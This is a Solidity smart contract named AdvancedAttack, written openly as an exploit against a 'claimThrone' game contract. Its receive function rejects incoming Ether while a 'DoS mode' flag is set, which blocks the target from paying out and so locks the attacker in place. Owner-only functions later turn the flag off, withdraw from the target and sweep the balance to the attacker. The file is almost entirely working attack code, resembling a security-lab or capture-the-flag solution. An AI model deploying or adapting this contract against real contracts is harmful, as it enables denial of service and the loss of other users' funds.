// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

interface ITarget {
    function claimThrone() external payable;
    function withdraw() external; 
}
contract AdvancedAttack {
    ITarget public targetContract;
    address payable public owner;
    bool public isDoSActive = true; 
    constructor(address _targetAddress) {
        targetContract = ITarget(_targetAddress);
        owner = payable(msg.sender);
    }
    modifier onlyOwner() {
        require(msg.sender == owner, "Only hacker can call this");
        _;
    }
    function setDoS(bool _isActive) public onlyOwner {
        isDoSActive = _isActive;
    }
    receive() external payable {
        if (isDoSActive) {

            revert("DoS Mode ON: I reject your Ether!");
        } else {

        }
    }
    function attack() public payable {
        targetContract.claimThrone{value: msg.value}();
    }
    function withdrawFromSafe() public onlyOwner {
        isDoSActive = false;
        targetContract.withdraw();
    }
    function collectFunds() public onlyOwner {
        (bool success, ) = owner.call{value: address(this).balance}("");
        require(success, "Failed to send Ether");
    }
}